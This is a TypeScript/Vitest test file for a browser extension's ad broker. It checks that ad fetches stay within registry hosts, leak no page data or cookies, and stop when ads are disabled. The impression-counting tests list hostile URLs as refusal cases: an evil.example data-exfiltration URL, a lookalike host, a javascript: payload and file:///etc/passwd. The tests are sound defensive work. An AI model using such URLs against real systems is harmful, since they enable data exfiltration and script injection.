/**
 * The service worker's ad broker.
 *
 * Ads are fetched here and nowhere else, for the same reason deep analysis is:
 * the worker is the extension's single network boundary, so keeping ad traffic
 * inside it means the audit surface does not grow. A fetch added to the popup
 * would be a second boundary, and the popup is a page that renders a grade.
 *
 * The load-bearing cases are the two that constrain what leaves the machine:
 * the request body must be exactly the declared key set, and switching ads off
 * must prevent the request from being made at all rather than discarding the
 * response after the fact.
 */

// @vitest-environment happy-dom

import { beforeEach, describe, expect, it, vi } from 'vitest';
import { AD_REQUEST_KEYS } from '../src/shared/ads/policy.js';
import { AD_NETWORKS, activeNetworks } from '../src/shared/ads/registry.js';
import { SETTINGS_KEY } from '../src/shared/settings.js';

type Listener = (message: unknown, sender: unknown, sendResponse: (r: unknown) => void) => boolean;

let listeners: Listener[];
let fetchMock: ReturnType<typeof vi.fn>;

const ORIGIN = activeNetworks()[0]!.origin;

function creativePayload(): unknown {
  return {
    headline: 'Ship faster with Widgets',
    body: 'A tool for people who build things.',
    advertiser: 'Widget Co',
    clickUrl: `${ORIGIN}/click/abc`,
    imageUrl: `${ORIGIN}/img/abc.png`,
    viewUrl: `${ORIGIN}/view/abc`,
  };
}

/** Load the worker fresh with a stubbed extension environment. */
async function loadWorker(
  settings: Record<string, unknown> = {},
  fetchImpl?: () => Promise<Response>,
): Promise<void> {
  const storage: Record<string, unknown> = { [SETTINGS_KEY]: settings };
  listeners = [];

  (globalThis as unknown as { chrome: unknown }).chrome = {
    runtime: {
      onInstalled: { addListener: vi.fn() },
      onMessage: { addListener: (fn: Listener) => listeners.push(fn) },
    },
    storage: {
      local: {
        get: vi.fn(async (key: string) => ({ [key]: storage[key] })),
        set: vi.fn(async () => undefined),
      },
    },
  };

  fetchMock = vi.fn(
    fetchImpl ?? (async () => new Response(JSON.stringify(creativePayload()), { status: 200 })),
  );
  vi.stubGlobal('fetch', fetchMock);

  vi.resetModules();
  await import('../src/background/index.js');
}

/** Dispatch to every listener the way Chrome does; resolve with the first reply. */
function send(message: unknown): Promise<{ ok: boolean; creative?: unknown }> {
  return new Promise((resolve) => {
    let settled = false;
    const reply = (response: unknown) => {
      if (settled) return;
      settled = true;
      resolve(response as { ok: boolean; creative?: unknown });
    };
    let handled = false;
    for (const listener of listeners) {
      if (listener(message, {}, reply) === true) handled = true;
    }
    if (!handled) resolve({ ok: false });
  });
}

beforeEach(() => {
  vi.unstubAllGlobals();
});

describe('ad broker', () => {
  it('requests an ad from a registry host only', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const url = String(fetchMock.mock.calls[0]![0]);
    expect(activeNetworks().some((n) => url.startsWith(n.origin))).toBe(true);
  });

  it('sends exactly the declared key set and nothing about the page', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    const init = fetchMock.mock.calls[0]![1] as RequestInit;
    const body = JSON.parse(String(init.body)) as Record<string, unknown>;
    expect(Object.keys(body).sort()).toEqual([...AD_REQUEST_KEYS].sort());
  });

  it('carries no cookies, no cache and no referrer', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    const init = fetchMock.mock.calls[0]![1] as RequestInit;
    // Ambient credentials would let the network correlate the request with any
    // other session it can see; a referrer would name the surface asking.
    expect(init.credentials).toBe('omit');
    expect(init.cache).toBe('no-store');
    expect(init.referrerPolicy).toBe('no-referrer');
  });

  it('makes no request at all when ads are switched off', async () => {
    // Not "discards the response" — the request must never leave. Fetching and
    // then throwing the result away still tells the network this install exists.
    await loadWorker({ adsEnabled: false });
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });

    expect(fetchMock).not.toHaveBeenCalled();
    expect(response.creative).toBe(null);
  });

  it('returns a creative when the network answers well', async () => {
    await loadWorker({ adsEnabled: true });
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.ok).toBe(true);
    expect((response.creative as { advertiser: string }).advertiser).toBe('Widget Co');
  });

  it('renders nothing rather than failing when the network errors', async () => {
    await loadWorker({ adsEnabled: true }, async () => new Response('', { status: 500 }));
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.ok).toBe(true);
    expect(response.creative).toBe(null);
  });

  it('renders nothing rather than failing when the fetch rejects', async () => {
    await loadWorker({ adsEnabled: true }, async () => {
      throw new Error('offline');
    });
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.ok).toBe(true);
    expect(response.creative).toBe(null);
  });

  it('renders nothing when the network returns unparseable json', async () => {
    await loadWorker({ adsEnabled: true }, async () => new Response('not json', { status: 200 }));
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.creative).toBe(null);
  });

  it('renders nothing when the network returns a hostile creative', async () => {
    await loadWorker(
      { adsEnabled: true },
      async () =>
        new Response(
          JSON.stringify({ ...(creativePayload() as object), clickUrl: 'javascript:alert(1)' }),
          { status: 200 },
        ),
    );
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.creative).toBe(null);
  });

  it('never contacts an unconfigured network', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    const unconfigured = AD_NETWORKS.filter((n) => !n.configured);
    expect(unconfigured.length).toBeGreaterThan(0); // control
    const url = String(fetchMock.mock.calls[0]![0]);
    for (const network of unconfigured) {
      expect(url.startsWith(network.origin)).toBe(false);
    }
  });

  it('ignores messages that are not ad requests', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:something-else' });
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('control: the fetch spy does record calls', async () => {
    // Four assertions above are "fetch was not called". Prove the spy can see
    // a call at all, or those four pass whether or not the code is correct.
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(fetchMock).toHaveBeenCalled();
  });
});

/**
 * Impression counting, which is the one place a URL arrives by message.
 *
 * Everything else the worker fetches is built from the registry. A view URL
 * comes in on `winnow:ad-view`, and any code that can send a runtime message
 * can therefore propose a destination. Unvalidated, that is an exfiltration
 * primitive: `winnow:ad-view` with `viewUrl: https://evil.example/?d=<data>`
 * turns the worker into a willing courier.
 *
 * This is the same hazard `isDevEndpoint` exists to close for the developer
 * endpoint setting, and it deserves the same treatment rather than trust in
 * the fact that today's only caller happens to pass a validated value.
 */
describe('impression counting', () => {
  it('counts a view on a registry host', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/abc` });
    await new Promise((r) => setTimeout(r, 0));

    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(String(fetchMock.mock.calls[0]![0])).toBe(`${ORIGIN}/view/abc`);
  });

  it.each([
    'https://evil.example.com/?d=leak',
    'http://server.ethicalads.io/view/abc',
    'javascript:alert(1)',
    'file:///etc/passwd',
    'https://server.ethicalads.io.evil.com/view',
    '',
    'not a url',
  ])('refuses to fetch %s', async (viewUrl) => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-view', viewUrl });
    await new Promise((r) => setTimeout(r, 0));

    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('counts no view when ads are switched off', async () => {
    // Someone who turned sponsorship off has asked not to be counted, and a
    // stale message must not count them anyway.
    await loadWorker({ adsEnabled: false });
    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/abc` });
    await new Promise((r) => setTimeout(r, 0));

    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('control: the view fetch does happen for a valid url', async () => {
    // Nine assertions above are "fetch was not called". Prove the path works.
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/xyz` });
    await new Promise((r) => setTimeout(r, 0));
    expect(fetchMock).toHaveBeenCalled();
  });
});
